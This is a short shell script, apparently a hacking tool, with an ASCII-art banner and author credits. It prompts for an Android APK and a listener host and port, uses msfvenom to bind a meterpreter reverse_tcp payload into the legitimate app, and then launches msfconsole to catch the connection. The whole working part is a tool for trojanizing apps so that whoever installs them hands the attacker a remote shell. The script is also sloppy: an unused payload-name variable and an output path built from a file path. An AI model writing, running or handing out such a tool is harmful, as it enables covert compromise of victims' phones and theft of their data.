clear
#Banner Start
echo -e "\e[31m                                                                                                    
                                             ....                                                   
                                        .~7~!~!!^:::~?7777~:                          .             
                                      .JJ!7^^::..:::~~::~7^?J.                       ..             
                                      5?7~!7~::..:::::::~7^^~?                                      
                                     ?7~~^~!^::..::::.::^^^::!!                                     
                                    .GY~^~~~~::::::^^:::::::~^Y:                                    
                                    ?5Y^^:.  .:::::^:.    ^YY^~?                                    
                                   .Y^^^:      ::^::.      !?!^Y.      .                            
                                   .7^^^:      .^:::^      :~~:7.      .                            
                                    .::::..  .77^~^^!~.   .:::^:                      ..            
                                      :7!~~!!!J~JJJ5!7?7!~^::.                                      
                                       .~Y~^J7?!5~!5?~~~^!5^                                        
                                         ?G!YJ?!!7??~~^~?Y7                                  .      
                                          ~~57~7!77JJ?!7~!                .                         
                                 ..       .^~~777?JJY5G?^^       ..                                 
                                :!7:!~.    ^:::^^!?~!!?^:     ...^^.                                
                               7P!.  ~?~:. ..:::^!??7~:.  ...~^   :^.                               
                        ..   .GBY   :!.  7?~^. ..~^!^. ..::   ^.   .^^                              
                            ~GYP^..?7   ~Y. .^:.   ..::   ^:   !7  .~~7:                            
                            :7PBBPJ?...77   :^  .:.   :.   ^~. .!!?J?!^.                            
                               .^YGGPJJ!. .?J::~^^:.   .:   ^!!7!7~:                   .            
                    .              :!5GG5!?P:  ~!!!!!.  7?!777~:                                    
            .                       .^J5^  7Y.  :77!777YPP?~J7~.                                    
                                .^757. !J.  ~P:  ~~?5PP~.  ?!  !57:.                                
                             .7YJ:.!?.  ~5^  ~7~?G#B?7~  :5~   7!..?Y7.                             
                              P?7.  ^?:  ~P?Y5GP5~~YPG5Y?5~  :?^   !7P.                             
                               !G5:  :?~~Y##G?:      :7PBBY~~J:  .7J^                               
                                ^BY!?J5GGY~.             ^?5PJ7!~7P^                                
            .                    :PYGGJ:                    .^!777.                                 
                                   :.                           .                           .     \e[0m"
                                   
                                   echo -e " Author  = github.com/qorsan73        "
echo -e "\e[34m instagram : https://instagram.com/mostafa.qt73          \e[0m "
echo -e "\e[49m                                 \e[2m"

#Bind Backdoor
read -p "[*]Enter filepath of apk#~: " path
read -p "[*]Enter output payload name#~: " payload
read -p "[*]Enter lhost#~: " lhost
read -p "[*]Enter lport#~: " lport
echo -e "\e[31m[*]Reverse Engineering Started..;p\e[0m"
pkg install apktool
msfvenom -x $path -p android/meterpreter/reverse_tcp lhost=$lhost lport=$lport R> $path/binded.apk
echo "done"
#start listner

msfconsole
#dont copy this code withou credit
